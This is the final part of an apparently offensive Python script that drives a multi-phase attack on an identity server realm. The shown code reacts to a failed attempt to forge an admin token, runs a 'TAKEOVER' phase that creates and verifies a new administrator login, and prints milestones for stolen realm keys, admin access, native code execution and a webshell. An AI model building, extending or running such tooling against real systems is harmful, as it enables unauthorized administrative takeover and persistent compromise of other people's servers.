        timer.log("~", "Could not forge a valid admin token")
        timer.log("~", "Keys may be expired, rotated, or wrong algorithm")
        _print_summary(timer, milestones)
        return

    # ── Phase 8: TAKEOVER ──
    takeover_ok = phase_takeover(
        timer, args.url, args.realm, admin_token, args.username)

    if takeover_ok:
        milestones["admin_login"] = True
        timer.log("+", f"{GREEN}New administrator login verified "
                       f"/ {args.username}{NC}")

    # ── Summary ──
    _print_summary(timer, milestones)


def _print_summary(timer, milestones):
    elapsed = timer.elapsed()
    run_elapsed = timer.run_elapsed()

    print()
    print(f"  ELAPSED   {timer.fmt(elapsed)}"
          f"          ACCESS  "
          f"{'MASTER ADMIN' if milestones['admin_login'] else 'NONE'}")
    print(f"  THIS RUN  {timer.fmt(run_elapsed)}"
          f"          TRY     {timer.try_count:02d}")
    print()

    def ms(label, done):
        return (f"{GREEN}■ {label}{NC}" if done
                else f"{DIM}□ {label}{NC}")

    print(f"  {ms('REALM KEY', milestones['realm_key'])}    "
          f"{ms('ADMIN LOGIN', milestones['admin_login'])}    "
          f"{ms('NATIVE ACE', milestones['native_ace'])}    "
          f"{ms('WEBSHELL', milestones['webshell'])}")
    print()


if __name__ == "__main__":
    main()
